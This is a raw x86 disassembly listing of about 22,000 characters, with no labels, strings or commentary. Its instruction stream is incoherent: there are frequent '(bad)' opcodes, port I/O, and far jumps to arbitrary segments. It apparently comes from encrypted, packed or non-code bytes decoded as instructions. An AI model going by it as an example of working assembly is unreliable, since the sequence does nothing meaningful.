  40dfc6:	out    0x18,eax
  40dfc8:	xchg   ebp,eax
  40dfc9:	cld    
  40dfca:	pop    eax
  40dfcb:	pop    ebp
  40dfcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfcd:	aad    0x5
  40dfcf:	mov    BYTE PTR ds:0x5d20ecc9,dl
  40dfd5:	shl    DWORD PTR [ecx],cl
  40dfd7:	addr16 iret 
  40dfd9:	cdq    
  40dfda:	add    DWORD PTR [ebx],ecx
  40dfdc:	or     esi,0x158f73
  40dfe2:	cmp    DWORD PTR [esi+0x120feabd],edi
  40dfe8:	mov    eax,DWORD PTR [eax-0x18]
  40dfeb:	jne    0x40df99
  40dfed:	push   0x33
  40dfef:	out    0x1f,eax
  40dff1:	fadd   DWORD PTR [edx+0x45]
  40dff4:	xchg   edi,eax
  40dff5:	loope  0x40dfed
  40dff7:	ins    BYTE PTR es:[edi],dx
  40dff8:	xchg   ebx,eax
  40dff9:	pop    edx
  40dffa:	mov    dh,0xff
  40dffc:	xor    DWORD PTR [bx+di-0x779f],edx
  40e001:	mov    edx,0x7539ecaa
  40e006:	aam    0xb4
  40e008:	mov    ebx,0xd7afd1f8
  40e00d:	scas   al,BYTE PTR es:[edi]
  40e00e:	retf   0x5763
  40e011:	repz jns 0x40dffe
  40e014:	inc    esi
  40e015:	sbb    ebx,DWORD PTR [edx+0x76]
  40e018:	leave  
  40e019:	jbe    0x40e077
  40e01b:	pop    esp
  40e01c:	inc    edi
  40e01d:	jns    0x40e078
  40e01f:	fwait
  40e020:	aaa    
  40e021:	sti    
  40e022:	sahf   
  40e023:	fcmovnu st,st(0)
  40e025:	jl     0x40e08c
  40e027:	lods   eax,DWORD PTR ds:[esi]
  40e028:	push   eax
  40e029:	mov    eax,0xfb16b299
  40e02e:	mov    cl,0x9c
  40e030:	repnz in al,0x7b
  40e033:	or     bl,dh
  40e035:	retf   0xd3b2
  40e038:	je     0x40dff0
  40e03a:	test   ecx,0x74b8f200
  40e040:	mov    eax,ds:0xf453fed5
  40e045:	fsub   DWORD PTR [ebx]
  40e047:	jge    0x40e081
  40e049:	in     al,0x9e
  40e04b:	sti    
  40e04c:	jne    0x40dfe0
  40e04e:	jbe    0x40e080
  40e050:	xlat   BYTE PTR ds:[ebx]
  40e051:	lock adc bh,cl
  40e054:	jp     0x40dffc
  40e056:	scas   al,BYTE PTR es:[edi]
  40e057:	fild   WORD PTR [esi]
  40e059:	in     eax,dx
  40e05a:	mov    eax,0x302197e7
  40e05f:	repz and DWORD PTR [eax+0x23],edi
  40e063:	std    
  40e064:	and    DWORD PTR [esp+ebp*4+0xded9444],ebx
  40e06b:	ror    DWORD PTR [esi*1+0x73129f66],cl
  40e072:	mov    ebx,0x6cc06a92
  40e077:	push   edi
  40e078:	fwait
  40e079:	xor    BYTE PTR [ecx+0x57a68597],dh
  40e07f:	sub    eax,0x521e17f
  40e084:	imul   ecx,DWORD PTR [ebp-0x6e99a1f0],0xe9222d4f
  40e08e:	ins    DWORD PTR es:[edi],dx
  40e08f:	jb     0x40e0cb
  40e091:	test   eax,0xaa1e612c
  40e096:	push   DWORD PTR fs:[esi+0x5578bc81]
  40e09d:	js     0x40e08c
  40e09f:	fsubr  st(3),st
  40e0a1:	push   edx
  40e0a2:	call   ebp
  40e0a4:	(bad)  
  40e0a5:	scas   al,BYTE PTR es:[edi]
  40e0a6:	xchg   esi,eax
  40e0a7:	sub    ebx,DWORD PTR [esi+0xf]
  40e0aa:	sbb    ebx,DWORD PTR [esi-0x3a]
  40e0ad:	or     DWORD PTR [eax-0x6c4bb102],ebp
  40e0b3:	inc    esp
  40e0b4:	ret    
  40e0b5:	dec    edx
  40e0b6:	jg     0x40e0ab
  40e0b8:	popf   
  40e0b9:	and    BYTE PTR [edx-0x40],dl
  40e0bc:	mov    ah,0x30
  40e0be:	xchg   ebx,eax
  40e0bf:	or     al,0x36
  40e0c1:	push   ebx
  40e0c2:	sub    edx,DWORD PTR [eax-0x16c1217d]
  40e0c8:	fdiv   st(1),st
  40e0ca:	or     ah,dl
  40e0cc:	ret    0x2645
  40e0cf:	xor    BYTE PTR [edx+0x324b1126],al
  40e0d5:	les    edi,FWORD PTR [ebx-0x2a]
  40e0d8:	push   es
  40e0d9:	or     al,0x4c
  40e0db:	ja     0x40e148
  40e0dd:	div    BYTE PTR [ecx+ecx*2-0x388c86b9]
  40e0e4:	dec    eax
  40e0e5:	dec    eax
  40e0e6:	imul   edi,DWORD PTR [edx],0x67
  40e0e9:	stos   DWORD PTR es:[edi],eax
  40e0ea:	xchg   esp,eax
  40e0eb:	aaa    
  40e0ec:	push   esp
  40e0ed:	or     BYTE PTR [ebx+0x3f],ch
  40e0f0:	dec    esi
  40e0f1:	pop    eax
  40e0f2:	ja     0x40e0b8
  40e0f4:	adc    edi,DWORD PTR [ebx]
  40e0f6:	out    0x9b,al
  40e0f8:	ins    BYTE PTR es:[edi],dx
  40e0f9:	jb     0x40e166
  40e0fb:	sub    al,0x8
  40e0fd:	ins    BYTE PTR es:[edi],dx
  40e0fe:	pop    ss
  40e0ff:	pop    ds
  40e100:	dec    edi
  40e101:	dec    ebp
  40e102:	cmc    
  40e103:	sub    esp,DWORD PTR [esi-0x2d]
  40e106:	sub    BYTE PTR [edx+edi*1-0x21],dl
  40e10a:	cmp    dl,cl
  40e10c:	fdivr  DWORD PTR [edx]
  40e10e:	adc    eax,0x8cf434c1
  40e113:	int3   
  40e114:	jg     0x40e148
  40e116:	std    
  40e117:	int    0x3
  40e119:	ins    DWORD PTR es:[edi],dx
  40e11a:	or     ah,dh
  40e11c:	test   edi,edx
  40e11e:	dec    ebp
  40e11f:	push   es
  40e120:	mov    bh,0x87
  40e122:	neg    BYTE PTR [eax-0x8aa0b35]
  40e128:	sbb    DWORD PTR [edx+0x47],esp
  40e12b:	pop    edx
  40e12c:	enter  0x4762,0x18
  40e130:	mov    dh,0x0
  40e133:	aaa    
  40e134:	adc    al,bl
  40e136:	pop    ebx
  40e137:	mov    ds,WORD PTR [edi-0x5a7229c0]
  40e13d:	test   DWORD PTR [eax+0x78],eax
  40e140:	push   0xeddfa577
  40e145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e146:	mov    BYTE PTR [esi-0x6],dh
  40e149:	iret   
  40e14a:	cld    
  40e14b:	scas   al,BYTE PTR es:[edi]
  40e14c:	jmp    0xb24d0d2c
  40e151:	push   eax
  40e152:	mov    cl,0x2b
  40e154:	popf   
  40e155:	stos   DWORD PTR es:[edi],eax
  40e156:	push   eax
  40e157:	sbb    BYTE PTR [ecx],al
  40e159:	adc    DWORD PTR [edx+0xb],esi
  40e15c:	mov    esp,0x3017b518
  40e161:	mov    BYTE PTR [edi+edi*4+0x41],ah
  40e165:	inc    esi
  40e166:	jo     0x40e131
  40e168:	and    dl,BYTE PTR [ecx-0x10aa6cf9]
  40e16e:	inc    DWORD PTR [esi]
  40e170:	cdq    
  40e171:	je     0x40e167
  40e173:	pusha  
  40e174:	sub    DWORD PTR ds:[ecx+edx*8+0x6],ecx
  40e179:	test   al,0xf4
  40e17b:	adc    cl,BYTE PTR [edi+0x4c]
  40e17e:	pop    ds
  40e17f:	in     eax,dx
  40e180:	ss mov bh,0x7a
  40e183:	mov    al,ds:0xefaba28b
  40e188:	out    0xef,eax
  40e18a:	ins    DWORD PTR es:[edi],dx
  40e18b:	mov    bl,0xf3
  40e18d:	push   esp
  40e18e:	stc    
  40e18f:	and    esi,ebp
  40e191:	mov    ds:0xa62a4718,eax
  40e196:	addr16 pop esi
  40e198:	scas   eax,DWORD PTR es:[edi]
  40e199:	sbb    DWORD PTR [ecx],ecx
  40e19b:	sub    eax,0x38b17805
  40e1a0:	in     al,dx
  40e1a1:	jle    0x40e1c9
  40e1a3:	cmp    al,0xb4
  40e1a5:	pop    ds
  40e1a6:	mov    ecx,0x82f6f1df
  40e1ab:	neg    BYTE PTR [eax]
  40e1ad:	out    dx,al
  40e1ae:	cs js  0x40e151
  40e1b1:	cmc    
  40e1b2:	add    al,0x5a
  40e1b4:	mov    edi,0xf0a36152
  40e1b9:	or     dl,BYTE PTR [ebp+0x72]
  40e1bc:	xor    eax,DWORD PTR [edi+0x3e]
  40e1bf:	into   
  40e1c0:	std    
  40e1c1:	lods   eax,DWORD PTR ds:[esi]
  40e1c2:	push   eax
  40e1c3:	pop    ecx
  40e1c4:	ret    
  40e1c5:	add    DWORD PTR [eax],ebx
  40e1c7:	imul   esp,DWORD PTR [edx],0xe
  40e1ca:	ror    bl,cl
  40e1cc:	jmp    0xbf7a9d73
  40e1d1:	inc    edx
  40e1d2:	retf   0x9807
  40e1d5:	pop    ecx
  40e1d6:	ficom  DWORD PTR [edi+0x1d]
  40e1d9:	into   
  40e1da:	inc    edx
  40e1db:	rcl    DWORD PTR [esi-0x26],1
  40e1de:	push   edx
  40e1df:	add    eax,0xf8e7b879
  40e1e4:	mov    edi,0x99fc5342
  40e1e9:	mov    ebp,0xfcef037c
  40e1ee:	stos   BYTE PTR es:[edi],al
  40e1ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1f0:	mov    ebx,0xa1643b3e
  40e1f5:	mov    edx,0x766fd6a3
  40e1fa:	cld    
  40e1fb:	scas   eax,DWORD PTR es:[edi]
  40e1fc:	jae    0x40e204
  40e1fe:	push   0xad415a76
  40e203:	test   bh,0xe8
  40e206:	int3   
  40e207:	out    dx,al
  40e208:	add    eax,0x27b3e313
  40e20d:	cmp    al,0xc3
  40e20f:	adc    eax,0xb5c4a462
  40e214:	mov    ds:0xb37409ca,al
  40e219:	push   edx
  40e21a:	jnp    0x40e1b1
  40e21c:	aaa    
  40e21d:	add    al,0x94
  40e21f:	add    BYTE PTR [eax+eiz*4],cl
  40e222:	aad    0x54
  40e224:	or     esi,DWORD PTR [edi+0x29]
  40e227:	fsub   DWORD PTR [edx-0x65]
  40e22a:	ins    BYTE PTR es:[edi],dx
  40e22b:	jmp    0x7c60:0x38bac1a7
  40e232:	hlt    
  40e233:	push   edx
  40e234:	cdq    
  40e235:	in     eax,dx
  40e236:	and    DWORD PTR [ecx-0x6e],ebp
  40e239:	jp     0x40e28f
  40e23b:	shr    BYTE PTR [ebx+0x21d7b073],1
  40e241:	mov    edi,edi
  40e243:	enter  0xa70f,0x4e
  40e247:	in     al,dx
  40e248:	xor    dl,BYTE PTR [ecx-0x75809ef6]
  40e24e:	loop   0x40e24b
  40e250:	loopne 0x40e2a8
  40e252:	dec    esi
  40e253:	xchg   edx,eax
  40e254:	bound  ebp,QWORD PTR [edi+0x40]
  40e257:	test   al,0xac
  40e259:	mov    esi,0x97a1bc8d
  40e25e:	mov    edi,0xe74706f6
  40e263:	pusha  
  40e264:	(bad)  
  40e266:	fisub  WORD PTR [ebp+0x11509ae8]
  40e26c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e26d:	scas   al,BYTE PTR es:[edi]
  40e26e:	mov    WORD PTR [edx+0x78e6386b],?
  40e274:	inc    edx
  40e275:	mov    esi,0xcce2ea1
  40e27a:	test   BYTE PTR [esi-0x14f7e5df],ch
  40e280:	sbb    edx,DWORD PTR [edx-0x49eaf138]
  40e286:	sbb    dl,BYTE PTR [edi+0x2f]
  40e289:	lahf   
  40e28a:	in     eax,dx
  40e28b:	mov    edx,0x94a81cb7
  40e290:	in     al,0x71
  40e292:	ins    BYTE PTR es:[edi],dx
  40e293:	call   0x339:0x64bfa65
  40e29a:	push   ds
  40e29b:	ja     0x40e278
  40e29d:	fwait
  40e29e:	arpl   WORD PTR [ebx+0x4d],si
  40e2a1:	iret   
  40e2a2:	inc    esp
  40e2a3:	lds    eax,FWORD PTR ds:0xaf56e36c
  40e2a9:	xlat   BYTE PTR ds:[ebx]
  40e2aa:	xor    al,0xb
  40e2ac:	cli    
  40e2ad:	fs xchg ecx,eax
  40e2af:	sub    BYTE PTR [eax+esi*4],dh
  40e2b2:	nop
  40e2b3:	fcom   st(3)
  40e2b5:	pop    es
  40e2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2b7:	pop    esp
  40e2b8:	mov    esp,DWORD PTR [ecx]
  40e2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2bb:	pushf  
  40e2bc:	clc    
  40e2bd:	or     esp,ecx
  40e2bf:	sbb    DWORD PTR [ebp+0x2d6ddaf0],0x886ca0a6
  40e2c9:	push   edi
  40e2ca:	stc    
  40e2cb:	sbb    esp,edx
  40e2cd:	sbb    DWORD PTR [ecx+0x8],edx
  40e2d0:	scas   al,BYTE PTR es:[edi]
  40e2d1:	es pop ebx
  40e2d3:	pop    ebp
  40e2d4:	in     eax,0x21
  40e2d6:	mov    ah,BYTE PTR [edi-0x37]
  40e2d9:	inc    esp
  40e2da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2db:	cmp    eax,0xf833a70c
  40e2e0:	add    cl,BYTE PTR [esp+esi*2+0x374c68b3]
  40e2e7:	pop    es
  40e2e8:	sbb    eax,0x36917f32
  40e2ed:	scas   eax,DWORD PTR es:[edi]
  40e2ee:	pop    ebx
  40e2ef:	scas   eax,DWORD PTR es:[edi]
  40e2f0:	sar    DWORD PTR [ebx+0x7e],1
  40e2f3:	xor    eax,0x21646a42
  40e2f8:	loop   0x40e325
  40e2fa:	fwait
  40e2fb:	lods   al,BYTE PTR ds:[esi]
  40e2fc:	std    
  40e2fd:	and    eax,0x2864bd84
  40e302:	jl     0x40e310
  40e304:	iret   
  40e305:	adc    BYTE PTR [ecx-0x17],bl
  40e308:	xchg   ebx,eax
  40e309:	lock push ebp
  40e30b:	sbb    BYTE PTR ds:0x48bfc954,bh
  40e311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e312:	scas   al,BYTE PTR es:[edi]
  40e313:	jbe    0x40e2dc
  40e315:	je     0x40e370
  40e317:	jp     0x40e302
  40e319:	jge    0x40e306
  40e31b:	push   ebp
  40e31c:	mov    esp,edi
  40e31e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e31f:	adc    DWORD PTR [edx+0x7210398a],0x5596b23
  40e329:	stos   DWORD PTR es:[edi],eax
  40e32a:	scas   eax,DWORD PTR es:[edi]
  40e32b:	mov    eax,0xa5f26f29
  40e330:	lods   al,BYTE PTR ds:[esi]
  40e331:	stos   DWORD PTR es:[edi],eax
  40e332:	sti    
  40e333:	pop    ebp
  40e334:	dec    eax
  40e335:	cld    
  40e336:	mov    ecx,0x5b408239
  40e33b:	stos   BYTE PTR es:[edi],al
  40e33c:	nop    eax
  40e33f:	add    al,0xb4
  40e341:	lods   eax,DWORD PTR ds:[esi]
  40e342:	mov    eax,0xc8a66d5d
  40e347:	pop    eax
  40e348:	out    dx,eax
  40e349:	loopne 0x40e2d7
  40e34b:	sub    edi,DWORD PTR [ebp-0x799c4783]
  40e351:	adc    al,0x96
  40e353:	shl    DWORD PTR [eax+0x41],cl
  40e356:	lea    edi,[edx+0x6b]
  40e359:	jmp    0xacfe:0x5d47597c
  40e360:	mov    esp,0x5b0e4d15
  40e365:	shl    BYTE PTR [eax-0x279e4a92],0x39
  40e36c:	xor    ecx,DWORD PTR ds:0xb1153739
  40e372:	ds loope 0x40e3be
  40e375:	inc    ebp
  40e376:	inc    esi
  40e377:	and    al,0xdf
  40e379:	or     al,0xe
  40e37b:	fdiv   st(6),st
  40e37d:	jge    0x40e3e3
  40e37f:	sar    ah,cl
  40e381:	dec    BYTE PTR [edi+0xd695ddc]
  40e387:	and    al,0xe5
  40e389:	jmp    0x56202a6c
  40e38e:	out    dx,al
  40e38f:	xchg   ebp,eax
  40e390:	pop    esi
  40e391:	mov    dl,0x10
  40e393:	(bad)
  40e396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e397:	dec    esp
  40e398:	mov    ch,0xb6
  40e39a:	retf   0x651
  40e39d:	jno    0x40e36e
  40e39f:	sti    
  40e3a0:	imul   ecx,esi,0x3297d909
  40e3a6:	scas   al,BYTE PTR es:[edi]
  40e3a7:	icebp  
  40e3a8:	jae    0x40e3fa
  40e3aa:	lods   al,BYTE PTR ds:[esi]
  40e3ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3ac:	sbb    al,0x88
  40e3ae:	or     BYTE PTR [edi],bh
  40e3b0:	add    dh,ah
  40e3b2:	xor    DWORD PTR [ebx-0x4f],eax
  40e3b5:	mov    ds:0xa306db0,al
  40e3ba:	test   eax,0xf4181c52
  40e3bf:	daa    
  40e3c0:	jno    0x40e41a
  40e3c2:	popf   
  40e3c3:	lds    eax,FWORD PTR [ebp+0x4cd0e939]
  40e3c9:	mov    dh,BYTE PTR [edx+0x277aab3a]
  40e3cf:	cmp    eax,0xf9216b21
  40e3d4:	aas    
  40e3d5:	cmp    eax,0xbfb716e6
  40e3da:	sbb    al,0x3d
  40e3dc:	dec    esp
  40e3dd:	jae    0x40e40f
  40e3df:	(bad)  
  40e3e1:	lock jno 0x40e418
  40e3e4:	push   edi
  40e3e5:	cli    
  40e3e6:	mov    DWORD PTR [edi],0x9d328962
  40e3ec:	jnp    0x40e42c
  40e3ee:	mov    dh,0x20
  40e3f0:	ret    
  40e3f1:	pop    ecx
  40e3f2:	mov    dl,0x86
  40e3f4:	sub    ch,ch
  40e3f6:	adc    DWORD PTR [eax],esp
  40e3f8:	scas   eax,DWORD PTR es:[edi]
  40e3f9:	pop    esi
  40e3fa:	scas   al,BYTE PTR es:[edi]
  40e3fb:	aas    
  40e3fc:	in     eax,0xeb
  40e3fe:	inc    edx
  40e3ff:	jl     0x40e411
  40e401:	ss cmc 
  40e403:	sbb    bh,BYTE PTR [edx+0x53]
  40e406:	clc    
  40e407:	out    0xed,al
  40e409:	dec    esi
  40e40a:	xchg   DWORD PTR [eax],ecx
  40e40c:	fidivr DWORD PTR [eax+0x41]
  40e40f:	js     0x40e409
  40e411:	ret    
  40e412:	xor    DWORD PTR [ecx],esp
  40e414:	loopne 0x40e3ff
  40e416:	test   al,0x4f
  40e418:	cvttps2pi mm6,QWORD PTR [eax+0x7e]
  40e41c:	jg     0x40e436
  40e41e:	push   0xabadc2b6
  40e423:	(bad)  
  40e424:	iret   
  40e425:	hlt    
  40e426:	mov    ecx,DWORD PTR ds:0x9dbba6c1
  40e42c:	push   edi
  40e42d:	push   eax
  40e42e:	repnz mov ds:0x9883c673,al
  40e434:	int3   
  40e435:	inc    edi
  40e436:	iret   
  40e437:	jmp    FWORD PTR [ecx+0x1aa0cfc6]
  40e43d:	js     0x40e4ba
  40e43f:	xor    edi,DWORD PTR [edi-0x4]
  40e442:	popa   
  40e443:	les    ebx,FWORD PTR [esi]
  40e445:	xor    al,0xc0
  40e447:	sbb    ebp,eax
  40e449:	test   eax,0x4195756d
  40e44e:	push   edi
  40e44f:	jno    0x40e437
  40e451:	outs   dx,BYTE PTR ds:[esi]
  40e452:	mov    dh,0x57
  40e454:	repnz xchg esi,eax
  40e456:	xor    al,0x33
  40e458:	fwait
  40e459:	mov    eax,0x1ee8bde9
  40e45e:	(bad)  
  40e45f:	fidiv  DWORD PTR ds:0x621aa856
  40e465:	jmp    0x40e481
  40e467:	lahf   
  40e468:	inc    ebp
  40e469:	fwait
  40e46a:	call   0xbe82:0xd776c23f
  40e471:	daa    
  40e472:	or     al,0x97
  40e474:	jno    0x40e4bb
  40e476:	mul    bh
  40e478:	(bad)  
  40e479:	das    
  40e47a:	(bad)  
  40e47b:	(bad)  
  40e47c:	jbe    0x40e415
  40e47e:	jmp    0x40e40d
  40e480:	repz push edi
  40e482:	jge    0x40e4bb
  40e484:	add    DWORD PTR [esi-0x1d817a0],eax
  40e48a:	pop    ebp
  40e48b:	shl    BYTE PTR [ebx],cl
  40e48d:	outs   dx,DWORD PTR ds:[esi]
  40e48e:	mov    ebp,0x4129ed77
  40e493:	push   ebp
  40e494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e495:	xchg   ebx,eax
  40e496:	xor    dh,bh
  40e498:	dec    edi
  40e499:	mov    ecx,0xe4906bc0
  40e49e:	cmp    ebx,DWORD PTR cs:[ecx-0x7b64b0be]
  40e4a5:	push   eax
  40e4a6:	sahf   
  40e4a7:	nop
  40e4a8:	xchg   ecx,eax
  40e4a9:	iret   
  40e4aa:	cmp    ebx,DWORD PTR [ecx-0x28]
  40e4ad:	sub    esi,esp
  40e4af:	push   eax
  40e4b0:	pop    esi
  40e4b1:	push   edi
  40e4b2:	mov    ebx,0x40fd59e
  40e4b7:	adc    edi,ebx
  40e4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4ba:	mov    BYTE PTR [ecx+0x43],ah
  40e4bd:	xor    al,0x40
  40e4bf:	ret    
  40e4c0:	imul   esi,eax,0xffffffce
  40e4c3:	and    al,BYTE PTR [edx+0x1cd5f780]
  40e4c9:	jge    0x40e516
  40e4cb:	adc    eax,0x66be6908
  40e4d0:	in     eax,0x98
  40e4d2:	rcl    BYTE PTR [edx+0x63b7707a],0xac
  40e4d9:	jnp    0x40e533
  40e4db:	stos   BYTE PTR es:[edi],al
  40e4dc:	in     al,dx
  40e4dd:	std    
  40e4de:	pushf  
  40e4df:	shl    DWORD PTR [edi],1
  40e4e1:	int3   
  40e4e2:	xchg   edx,eax
  40e4e3:	and    DWORD PTR [esi-0x64],edx
  40e4e6:	imul   BYTE PTR [ebx]
  40e4e8:	xor    eax,0xd6c5689c
  40e4ed:	stc    
  40e4ee:	sbb    al,0x94
  40e4f0:	imul   eax,esi,0xb9e5805d
  40e4f6:	in     eax,0xfd
  40e4f8:	loop   0x40e485
  40e4fa:	add    ecx,DWORD PTR [ebx]
  40e4fc:	cmp    eax,0xd1a16a2c
  40e501:	mov    eax,DWORD PTR [ecx+0x31]
  40e504:	push   ebp
  40e505:	pop    ebx
  40e506:	mov    al,0x67
  40e508:	and    bl,dl
  40e50a:	push   ss
  40e50b:	fdiv   st(0),st
  40e50d:	scas   al,BYTE PTR es:[edi]
  40e50e:	(bad)  
  40e50f:	mov    ecx,0x5d73a48f
  40e514:	push   0xea44c28b
  40e519:	shl    DWORD PTR [esi+0x29],cl
  40e51c:	sti    
  40e51d:	dec    ecx
  40e51e:	add    al,0x72
  40e520:	out    0xcf,eax
  40e522:	(bad)  
  40e523:	push   esp
  40e524:	fnsave [esi]
  40e526:	fwait
  40e527:	and    eax,0xe7f26f63
  40e52c:	pop    DWORD PTR [edi]
  40e52e:	pop    ss
  40e52f:	ins    BYTE PTR es:[edi],dx
  40e530:	dec    ecx
  40e531:	loop   0x40e548
  40e533:	popf   
  40e534:	add    al,0x29
  40e536:	aas    
  40e537:	lods   al,BYTE PTR ds:[esi]
  40e538:	xor    al,0x4
  40e53a:	pop    esi
  40e53b:	mov    ch,0xb3
  40e53d:	aaa    
  40e53e:	add    BYTE PTR [ebp-0x1ed156ce],dh
  40e544:	pop    es
  40e545:	cmc    
  40e546:	ss jle 0x40e4cf
  40e549:	mov    al,ds:0xc75b30a1
  40e54e:	jnp    0x40e4fc
  40e550:	or     ebx,DWORD PTR [ebp+ecx*1-0x2b5fe4c]
  40e557:	cmp    esp,DWORD PTR [edx+0x26]
  40e55a:	pop    eax
  40e55b:	int3   
  40e55c:	xor    BYTE PTR [eax],0x25
  40e55f:	(bad)  [esi+0x4efb081c]
  40e565:	inc    esp
  40e566:	dec    DWORD PTR [esi]
  40e568:	xchg   ch,ch
  40e56a:	adc    BYTE PTR [eax],dh
  40e56c:	ret    0x8eb8
  40e56f:	sub    dh,BYTE PTR [edi+0x3b586e47]
  40e575:	ja     0x40e5ad
  40e577:	push   es
  40e578:	or     eax,0xae3b67f6
  40e57d:	pop    esp
  40e57e:	aad    0xa8
  40e580:	and    DWORD PTR [esi+0x1a],ebp
  40e583:	jge    0x40e596
  40e585:	test   dl,dh
  40e587:	or     al,0x89
  40e589:	adc    dh,BYTE PTR [eax-0xa]
  40e58c:	and    cl,bl
  40e58e:	cmp    bh,BYTE PTR [ebp-0x3dc8cf9d]
  40e594:	inc    edx
  40e595:	add    BYTE PTR [eax],bl
  40e597:	data16 std 
  40e599:	xor    BYTE PTR [ebx-0xcbcab8b],bl
  40e59f:	and    DWORD PTR [eax+0x5d8a848a],ebp
  40e5a5:	xor    eax,0x3d543767
  40e5aa:	mov    cs:0x3fdee302,eax
  40e5b0:	out    dx,eax
  40e5b1:	sbb    edx,DWORD PTR [ebp+0x7d499906]
  40e5b7:	call   0xb44f:0xcf44ed1d
  40e5be:	xor    dh,BYTE PTR ds:0x50d43b66
  40e5c4:	jb     0x40e5f0
  40e5c6:	repz dec esi
  40e5c8:	loop   0x40e63e
  40e5ca:	mov    DWORD PTR [eax-0x40],0x43985a38
  40e5d1:	sbb    bh,BYTE PTR [edx-0x1887f0e6]
  40e5d7:	add    BYTE PTR [edi+ecx*2+0x6cfaece7],dh
  40e5de:	(bad)  
  40e5df:	jb     0x40e5cd
  40e5e1:	not    BYTE PTR [eax+0x15]
  40e5e4:	out    dx,eax
  40e5e5:	call   0x5f0f:0x8b838530
  40e5ec:	jbe    0x40e666
  40e5ee:	jo     0x40e636
  40e5f0:	fcmovu st,st(6)
  40e5f2:	cs jmp 0x40e5ed
  40e5f5:	sub    ah,ch
  40e5f7:	js     0x40e647
  40e5f9:	js     0x40e57c
  40e5fb:	cmp    DWORD PTR [edi],ecx
  40e5fd:	sub    ecx,DWORD PTR [ebx+0x2dc38a1f]
  40e603:	cmp    bh,al
  40e605:	std    
  40e606:	or     eax,DWORD PTR ss:[ecx+0x70]
  40e60a:	iret   
  40e60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e60c:	pop    ds
  40e60d:	pop    edi
  40e60e:	lock xor al,0xb9
  40e611:	out    0x7f,al
  40e613:	jecxz  0x40e677
  40e615:	xor    edi,DWORD PTR [edx+0x34812b9d]
  40e61b:	call   0x1aea:0x920d6da5
  40e622:	inc    ecx
  40e623:	jno    0x40e5b9
  40e625:	out    0x8a,eax
  40e627:	test   BYTE PTR [esi-0x64],bh
  40e62a:	les    ecx,FWORD PTR [ecx-0x6e9ec8a5]
  40e630:	icebp  
  40e631:	in     eax,dx
  40e632:	sbb    bl,BYTE PTR [edi+0x45]
  40e635:	loope  0x40e6a1
  40e637:	test   eax,0x9fe2b2a1
  40e63c:	dec    edi
  40e63d:	gs enter 0xf419,0x1f
  40e642:	imul   ebp,DWORD PTR [esi+0x6a],0xb4767f2e
  40e649:	inc    esp
  40e64a:	and    al,0x95
  40e64c:	mov    ah,0x33
  40e64e:	enter  0x59e9,0x87
  40e652:	xchg   edx,eax
  40e653:	out    dx,al
  40e654:	test   BYTE PTR [edx-0x60],dl
  40e657:	mov    ds:0x66a90561,eax
  40e65c:	ja     0x40e633
  40e65e:	xor    al,0xaa
  40e660:	xchg   esp,eax
  40e661:	jmp    0xfaca:0x9db5e930
  40e668:	push   esi
  40e669:	pushw  ss
  40e66b:	sbb    al,0xc7
  40e66d:	dec    esi
  40e66e:	call   0xd41:0x744d0f0e
  40e675:	nop
  40e676:	push   edi
  40e677:	sar    DWORD PTR [ebx],0x4f
  40e67a:	cld    
  40e67b:	sti    
  40e67c:	cmc    
  40e67d:	sub    al,0x7a
  40e67f:	cmp    eax,0x38777ba1
  40e684:	into   
  40e685:	dec    ebx
  40e686:	add    dh,bh
  40e688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e689:	mov    al,ds:0xb58afb21
  40e68e:	jb     0x40e62e
  40e690:	clc    
  40e691:	and    eax,0xe5b77e7e
  40e696:	mov    bh,0x54
  40e698:	mov    esi,0xa14a7f59
  40e69d:	fistp  DWORD PTR [ebx]
  40e69f:	jmp    0x23f1:0x2243ce02
  40e6a6:	inc    ecx
  40e6a7:	mov    ecx,edi
  40e6a9:	(bad)  
  40e6aa:	loop   0x40e67b
  40e6ac:	xor    dl,BYTE PTR [ecx-0x53]
  40e6af:	or     al,0xdb
  40e6b1:	call   0x5f5d:0x696afccb
  40e6b8:	repnz adc al,0x33
  40e6bb:	pop    ss
  40e6bc:	out    dx,al
  40e6bd:	rcl    ecx,0xc8
  40e6c0:	addr16 pushf 
  40e6c2:	push   edx
  40e6c3:	(bad)  
  40e6c4:	ins    BYTE PTR es:[edi],dx
  40e6c5:	add    DWORD PTR [edx+0xf],ebp
  40e6c8:	add    BYTE PTR [eax-0x12],0x25
  40e6cc:	cdq    
  40e6cd:	jae    0x40e6ba
  40e6cf:	mov    dh,0x9e
  40e6d1:	jl     0x40e705
  40e6d3:	xor    eax,0xe77c9809
  40e6d8:	leave  
  40e6d9:	sti    
  40e6da:	test   eax,0xbcd6a691
  40e6df:	jge    0x40e6ff
  40e6e1:	xlat   BYTE PTR ds:[ebx]
  40e6e2:	outs   dx,BYTE PTR ds:[esi]
  40e6e3:	mov    edx,0x5a45b46f
  40e6e8:	push   es
  40e6e9:	sbb    BYTE PTR [ebx+0x50330e22],ch
  40e6ef:	fdivr  DWORD PTR [ecx]
  40e6f1:	jmp    0x4d61b4b8
  40e6f6:	and    eax,0x46fcd1e9
  40e6fb:	xchg   ecx,eax
  40e6fc:	or     ch,cl
  40e6fe:	lds    ecx,FWORD PTR [edi-0x60]
  40e701:	adc    BYTE PTR [edi+0x45df9243],bh
  40e707:	dec    esi
  40e708:	push   eax
  40e709:	dec    edx
  40e70a:	push   0xb126da92
  40e70f:	outs   dx,BYTE PTR ds:[esi]
  40e710:	popf   
  40e711:	push   0xffffffc6
  40e713:	jecxz  0x40e77a
  40e715:	or     al,0x55
  40e717:	sbb    ecx,ebp
  40e719:	adc    DWORD PTR [esi],edx
  40e71b:	ins    BYTE PTR es:[edi],dx
